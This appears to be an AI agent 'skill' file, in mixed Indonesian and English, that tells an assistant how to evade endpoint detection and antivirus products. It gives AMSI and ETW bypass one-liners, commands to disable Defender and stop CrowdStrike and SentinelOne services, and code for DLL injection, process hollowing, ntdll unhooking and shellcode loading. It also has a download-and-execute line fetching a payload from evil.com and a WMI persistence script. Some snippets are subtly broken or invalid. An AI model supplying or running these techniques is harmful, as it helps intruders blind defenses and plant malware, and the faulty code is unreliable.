---
name: edr-bypass
description: |
  EDR/AV bypass techniques dalam Bahasa Indonesia. Gunakan saat user mau bypass endpoint detection, antivirus, atau security products untuk authorized testing.
  Kata kunci: edr bypass, antivirus bypass, edr evasion, bypass defender, bypass crowdstrike, bypass sentinel, process injection, dll injection, syscalls, unhook, etw bypass, amsi bypass.
---

# EDR/AV Bypass — Defense Evasion Techniques

> **Disclaimer:** Skill ini HANYA untuk authorized red team testing, penetration testing berizin, dan CTF. Bypass EDR tanpa izin = ILEGAL. JANGAN nekat.

---

## Pendahuluan

EDR (Endpoint Detection and Response) = software yang monitor activity di endpoint. Tugas lo: bypass detection ini tanpa ketahuan.

**Types of EDR/AV:**
- **EDR**: CrowdStrike, SentinelOne, Carbon Black, Microsoft Defender for Endpoint
- **AV**: Windows Defender, Kaspersky, Norton, McAfee, Bitdefender
- **HIPS**: Host-based Intrusion Prevention System

**Intensity guide:**
- `INTENSITY 1-3`: Recon (pahami EDR/AV apa yang dipake)
- `INTENSITY 4-6`: Testing (test bypass techniques)
- `INTENSITY 7-9`: Full evasion (kombinasi techniques)
- `INTENSITY 10`: Advanced (custom shellcode, kernel evasion)

---

## Tahap 1 — Reconnaissance

> Tujuan: Kenali EDR/AV apa yang dipake target.

### Detect EDR/AV

```powershell
# Check running processes
tasklist /v | findstr /i "crowdstrike sentinel carbon defender"

# Check services
sc query | findstr /i "crowdstrike sentinel defender carbon"

# Check installed software
wmic product get name | findstr /i "crowdstrike sentinel defender"

# Check registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "crowdstrike"

# Check drivers
driverquery /v | findstr /i "crowdstrike"
```

### Detect Security Products

```powershell
# Check Defender status
Get-MpComputerStatus

# Check if AMSI is enabled
reg query HKLM\SOFTWARE\Microsoft\AMSI\Providers

# Check if ETW is enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\WMI\Providers

# Check if AppLocker is enabled
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Check if WDAC is enabled
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

---

## Tahap 2 — AMSI Bypass

> AMSI (Antimalware Scan Interface) = Windows API untuk scan script. Bypass wajib sebelum jalankan payload.

### AMSI Bypass Techniques

```powershell
# Method 1: Patch amsi.dll
# Set context and patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Reflective DLL injection
# Load AMSI bypass DLL ke memory

# Method 3: Patch amsiScanBuffer
# NOP the comparison instruction

# Method 4: AMSI bypass via PowerShell
# Ref: https://amsi.fail/
# Generate bypass payload
```

### AMSI Bypass Scripts

```powershell
# AmsiScanBuffer bypass (patch function)
[Runtime.InteropServices.Marshal]::Copy([byte[]]@(0x83,0x78,0x28,0x00,0x75,0x0C,0xB8,0x57,0x00,0x07,0x80,0xC3), 0, [IntPtr](Add-Type 'System.Management.Automation.AmsiUtils' -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);' -Namespace 'win32' -Name 'utils' -PassThru).GetField('amsiScanBuffer','NonPublic,Static').GetValue($null), 12)

# Or use amsi.fail
```

---

## Tahap 3 — ETW Bypass

> ETW (Event Tracing for Windows) = Windows logging framework. Bypass untuk hide activity.

### ETW Bypass

```powershell
# Patch EtwEventWrite to return 0
$etw = [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_providerId','NonPublic,Instance')
# ... (complex implementation)

# Alternative: Disable ETW via registry
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Threat-Intelligence /v Enabled /t REG_DWORD /d 0 /f
```

---

## Tahap 4 — Process Injection

> Process Injection = inject code ke process lain. EDR harus detect injection.

### Process Injection Types

| Type | Description |
|------|-------------|
| **DLL Injection** | Load DLL ke process |
| **Process Hollowing** | Create suspended process, hollow, inject |
| **Thread Execution Hijacking** | Hijack existing thread |
| **APC Injection** | Queue APC ke thread |
| **Process Doppelgänging** | Transacted file + section |
| **Module Stomping** | Overload legitimate module |

### DLL Injection

```cpp
// Classic DLL Injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, remoteBuf, dllPath, strlen(dllPath), NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), remoteBuf, 0, NULL);
```

### Process Hollowing

```cpp
// Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
// Unmap, inject, resume
```

### APC Injection

```cpp
// APC Injection
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
QueueUserAPC((PAPCFUNC)GetAddress(hModule, "DllMain"), hThread, NULL);
```

---

## Tahap 5 — Unhooking

> Unhook = remove EDR hooks dari ntdll.dll. Restore original syscall.

### Unhook Techniques

| Technique | Description |
|-----------|-------------|
| **Fresh Copy** | Copy ntdll from disk |
| **Syscall** | Direct syscall bypassing hooks |
| **Indirect Syscall** | Syscall via gadget |
| **Halo's Gate** | Syscall via syscall stub |
| **Tartarus Gate** | Syscall via gadget chain |

### Fresh Copy Unhook

```cpp
// Load fresh ntdll from disk
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Copy over hooked ntdll
memcpy(GetModuleHandle("ntdll.dll"), pMapping, 0x1000);
```

### Direct Syscall

```asm
; Syscall number for NtAllocateVirtualMemory
mov r10, rcx
mov eax, 18h  ; syscall number
syscall
ret
```

---

## Tahap 6 — EDR Unhooking

> Specific EDR bypass techniques.

### CrowdStrike Bypass

```powershell
# Method 1: Driver vulnerability
# Load vulnerable driver, exploit to unload EDR

# Method 2: Kernel callback removal
# Remove registered callbacks

# Method 3: Process termination
# Kill EDR process (requires admin)
taskkill /f /falcon
```

### SentinelOne Bypass

```powershell
# Method 1: Agent communication disruption
# Block agent communication to cloud

# Method 2: Agent binary tampering
# Modify agent binaries

# Method 3: Service stop
sc stop SentinelAgent
sc stop SentinelStaticEngine
```

### Defender Bypass

```powershell
# Method 1: Registry key
Set-MpPreference -DisableRealtimeMonitoring $true

# Method 2: Exclusion
Add-MpPreference -ExclusionPath "C:\temp"

# Method 3: AMSI bypass (see Tahap 2)

# Method 4: PowerShell execution policy
Set-ExecutionPolicy Bypass -Scope Process
```

---

## Tahap 7 — Syscall Techniques

> Direct syscall = bypass user-mode hooks entirely.

### Syscall Table

| Syscall | Number (Win10) | Function |
|---------|----------------|----------|
| NtAllocateVirtualMemory | 0x18 | Allocate memory |
| NtWriteVirtualMemory | 0x3A | Write to process |
| NtCreateThreadEx | 0xC5 | Create thread |
| NtOpenProcess | 0x26 | Open process |
| NtProtectVirtualMemory | 0x49 | Change memory protection |
| NtMapViewOfSection | 0x28 | Map section |
| NtCreateSection | 0x4A | Create section |

### Hell's Gate

```cpp
// Hell's Gate: find syscall number from ntdll
// 1. Find syscall stub in ntdll
// 2. Extract syscall number
// 3. Call via syscall instruction
```

### Halo's Gate

```cpp
// Halo's Gate: syscall via adjacent syscall stubs
// 1. Find known syscall
// 2. Scan backwards/forwards
// 3. Use nearby syscall numbers
```

---

## Tahap 8 — Shellcode Execution

> Execute shellcode di memory tanpa detection.

### Shellcode Execution Methods

| Method | Detection Level |
|--------|-----------------|
| VirtualAlloc + CreateThread | High (monitored) |
| NtAllocateVirtualMemory | Medium |
| Section object mapping | Low |
| Fiber | Low |
| Token manipulation | Low |

### Shellcode Loader

```cpp
// Minimal shellcode loader
void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, buf, sizeof(buf));
((void(*)())exec)();
```

### Encrypted Shellcode

```cpp
// XOR encrypt shellcode
for (int i = 0; i < len; i++) {
    buf[i] = buf[i] ^ key[i % key_len];
}
// Execute
// Decrypt + execute in memory
```

---

## Tahap 9 — Fileless Malware

> Fileless = no file written to disk. Pure memory execution.

### Fileless Techniques

| Technique | Description |
|-----------|-------------|
| **PowerShell in-memory** | Execute script in memory |
| **WMI event subscription** | Persistence via WMI |
| **Registry-based** | Store payload in registry |
| **Scheduled Tasks** | Execute via task scheduler |

### PowerShell Fileless

```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Encoded command
powershell -enc <base64>
```

### WMI Persistence

```powershell
# Create WMI event subscription
FilterToConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = (Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = "Updater"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    })
    Consumer = (Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = "Updater"
        CommandLineTemplate = "powershell.exe -enc <payload>"
    })
}
```

---

## Tahap 10 — Detection Evasion Checklist

> Checklist buat bypass detection.

### Pre-Execution Checklist

| Check | Action |
|-------|--------|
| AMSI enabled? | Bypass AMSI (Tahap 2) |
| ETW enabled? | Bypass ETW (Tahap 3) |
| EDR hooks? | Unhook (Tahap 5-6) |
| Syscall available? | Use direct syscall (Tahap 7) |
| Memory protection? | Change page protection |
| Thread creation monitored? | Use existing thread |

### Evasion Matrix

| Technique | Defender | CrowdStrike | SentinelOne |
|-----------|----------|-------------|-------------|
| AMSI bypass | ✅ | ✅ | ✅ |
| ETW bypass | ✅ | ✅ | ✅ |
| Process injection | ⚠️ | ⚠️ | ⚠️ |
| Unhooking | ⚠️ | ⚠️ | ⚠️ |
| Direct syscall | ⚠️ | ⚠️ | ⚠️ |
| Fileless | ⚠️ | ⚠️ | ⚠️ |

---

## Tools Cheat Sheet

| Tool | Fungsi |
|------|--------|
| **ScyllaHide** | Anti-anti-debug, unhook |
| **HellsGate** | Syscall number extraction |
| **SysWhispers** | Direct syscall generation |
| **Nim** | Compile to avoid detection |
| **Cobalt Strike** | C2 framework |
| **Sliver** | Open-source C2 |
| **MITRE ATT&CK** | Technique reference |

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| C2 infrastructure | `core/redteam-c2/SKILL.md` — Red team/C2 |
| Process injection | `core/exploit-dev/SKILL.md` — Exploit dev |
| Binary analysis | `core/reverse-binary/SKILL.md` — Reverse RE |
| Malware analysis | `core/malware-analysis/SKILL.md` — Malware |
| Privilege escalation | `core/exploit-dev/windows-privesc/SKILL.md` — Windows privesc |
| Lateral movement | `core/active-directory/SKILL.md` — AD |

---

## Resources

- **MITRE ATT&CK**: https://attack.mitre.org/techniques/
- **LOLBAS**: https://lolbas-project.github.io/
- **ScyllaHide**: https://github.com/x64dbg/ScyllaHide
- **SysWhispers**: https://github.com/jthurber4/SysWhispers
- **HellsGate**: https://github.com/am0nsec/HellsGate
- **Red Team Notes**: https://book.hacktricks.xyz/
